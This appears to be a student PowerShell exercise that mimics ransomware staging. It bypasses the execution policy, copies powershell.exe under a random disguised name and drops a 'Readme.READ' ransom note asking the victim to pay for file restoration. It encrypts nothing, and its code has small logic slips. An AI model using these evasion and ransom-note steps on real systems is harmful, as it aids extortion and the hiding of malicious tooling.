# Set Policy so session can be bypassed

Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process


# Make sure file doesn't exist before proceeding

$File_Check = "C:\Users\Asani-Web\Desktop\$File"

if (Test-Path $File_Check) {

    Write-Host -BackgroundColor "green" -ForegroundColor "white" "The powershell file was successfully copied already."
    }
    else {

        # Random integer between 1000 and 9876 for file name
        
        $Int = Get-random -Minimum 100 -Maximum 1999

        # Storing powershell.exe within a file

        $File = 'EnNob-' + $Int + '.exe'

        # Copy powershell.exe into a new file

        Copy-Item -Path "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -Destination "C:\Users\Asani-Web\Desktop\$File"
        Write-Host -BackgroundColor "red" -ForegroundColor "white" "The powershell file was not copied, but it was just made. Check the file path to make sure."

        # Saves file name so it isn't created over and over with a new integer

        $OldFile = $File

        $OldFile

    }

# ReadMe message if you want to restore file

 $Message = "If you want your files restored, please contact me at dunston@champlain.edu. I look forward to doing business with you."

 # Variable to check if file exist already

 $Read_Check = 'C:\Users\Asani-Web\Desktop\Readme.READ'

 if ( Test-path $Read_Check ) {

     write-host -backgroundcolor 'green' -foregroundcolor 'white' "$Read_Check was successfully created already."
    
    } else {

        # Creates ReadMe file if it doesn't exitst already

        $Message | Out-File -FilePath 'C:\Users\Asani-Web\Desktop\Readme.READ'

        write-host -backgroundcolor 'red' -ForegroundColor 'white' "$Read_Check was not created until now. Check the file path to make sure."
    }